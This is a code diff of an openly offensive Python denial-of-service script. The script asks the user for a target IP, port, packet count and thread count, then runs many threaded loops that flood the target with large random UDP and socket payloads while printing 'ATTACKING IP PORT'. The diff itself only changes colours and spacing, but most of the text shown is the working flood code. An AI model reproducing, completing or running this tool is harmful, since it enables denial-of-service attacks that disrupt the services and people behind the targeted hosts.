@@ -12,16 +12,16 @@ pink='\033[95m'
 red='\033[91m'
 b='\033[1m'
 ##############
-
+os.system("clear")
 print("""\033[93m
-            ANONYMOUS
+              ANONYMOUS
       ╭━━━╮     ╭╮ ╭━━━╮
       ┃╭━━╯     ┃┃ ╰╮╭╮┃
       ┃╰━━┳╮╭┳━━┫┃╭╮┃┃┃┣━━┳━━╮
       ┃╭━━┫┃┃┃╭━┫╰╯╯┃┃┃┃╭╮┃━━┫
       ┃┃  ┃╰╯┃╰━┫╭╮┳╯╰╯┃╰╯┣━━┃v2.3
       ╰╯  ╰━━┻━━┻╯╰┻━━━┻━━┻━━╯
-        Разнеси всех и вся 💥
+          Разнеси всех и вся 💥
 """)
 time.sleep(3)
 
@@ -34,19 +34,19 @@ print("""
 \033[35m██████░░░██████░░░░░███░░░░░░█████░
 """)
 print ()
-print("\033[31m━━━ Want to Ddos? (y/n)")
+print("\033[33m━━━ Want to Ddos? (y/n)")
 choice = str(input("┗━━━━━━>\033[0m:"))
 time.sleep(1)
-print("\033[31m━━━ Host/IP")
+print("\033[33m━━━ Host/IP")
 ip = str(input("┗━━━━━━>\033[0m:"))
 time.sleep(1)
-print("\033[31m━━━ Port")
+print("\033[33m━━━ Port")
 port = int(input("┗━━━━━━>\033[0m:"))
 time.sleep(1)
-print("\033[31m━━━ Pakets")	
+print("\033[33m━━━ Pakets")	
 times = int(input("┗━━━━━━>\033[0m:"))
 time.sleep(1)
-print("\033[31m━━━ Threads")
+print("\033[33m━━━ Threads")
 threads = int(input("┗━━━━━━>\033[0m:"))
 def run1():
   data = random._urandom(10024)
@@ -57,7 +57,7 @@ def run1():
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-        print(i +" \033[91m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
+        print(i +" \033[92m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
     except:
       print("[Zuto] Server Down KONTOL!!!")
 
@@ -70,7 +70,7 @@ def run2():
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-        print(i +" \033[91m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
+        print(i +" \033[92m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
     except:
       print("[Zuto] Server Down KONTOL!!!")
 
@@ -83,7 +83,7 @@ def run3():
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-        print(i +" \033[91m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
+        print(i +" \033[92m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
     except:
       print("[Zuto] Server Down KONTOL!!!")
 
@@ -96,7 +96,7 @@ def run4():
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-        print(i +" \033[91m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
+        print(i +" \033[92m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
     except:
       print("[Zuto] Server Down KONTOL!!!")
 
@@ -109,7 +109,7 @@ def run5():
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-        print(i +" \033[91m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
+        print(i +" \033[92m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
     except:
       print("[Zuto] Server Down KONTOL!!!")
 
@@ -122,7 +122,7 @@ def run6():
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-        print(i +" \033[91m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
+        print(i +" \033[92m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
     except:
       print("[Zuto] Server Down KONTOL!!!")
 
@@ -135,7 +135,7 @@ def run7():
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-        print(i +" \033[91m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
+        print(i +" \033[92m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
     except:
       print("[Zuto] Server Down KONTOL!!!")
 
@@ -148,7 +148,7 @@ def run8():
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-        print(i +" \033[91m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
+        print(i +" \033[92m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
     except:
       print("[Zuto] Server Down KONTOL!!!")
 
@@ -162,7 +162,7 @@ def run9():
       s.send(data)
       for x in range(times):
         s.send(data)
-        print(i +" \033[91m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
+        print(i +" \033[92m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
     except:
       s.close()
       print("[Zuto] Server Down KONTOL!!!")
@@ -177,7 +177,7 @@ def run10():
       s.send(data)
       for x in range(times):
         s.send(data)
-        print(i +" \033[91m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
+        print(i +" \033[92m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
     except:
       s.close()
       print("[Zuto] Server Down KONTOL!!!")
@@ -192,7 +192,7 @@ def run11():
       s.send(data)
       for x in range(times):
         s.send(data)
-        print(i +" \033[91m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
+        print(i +" \033[92m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
     except:
       s.close()
       print("[Zuto] Server Down KONTOL!!!")
@@ -207,7 +207,7 @@ def run12():
       s.send(data)
       for x in range(times):
         s.send(data)
-        print(i +" \033[91m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
+        print(i +" \033[92m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
     except:
       s.close()
       print("[Zuto] Server Down KONTOL!!!")
@@ -222,7 +222,7 @@ def run13():
       s.send(data)
       for x in range(times):
         s.send(data)
-        print(i +" \033[91m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
+        print(i +" \033[92m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
     except:
       s.close()
       print("[Zuto] Server Down KONTOL!!!")
@@ -237,7 +237,7 @@ def run14():
       s.send(data)
       for x in range(times):
         s.send(data)
-        print(i +" \033[91m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
+        print(i +" \033[92m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
     except:
       s.close()
       print("[Zuto] Server Down KONTOL!!!")
@@ -252,7 +252,7 @@ def run15():
       s.send(data)
       for x in range(times):
         s.send(data)
-        print(i +" \033[91m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
+        print(i +" \033[92m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
     except:
       s.close()
       print("[Zuto] Server Down KONTOL!!!")
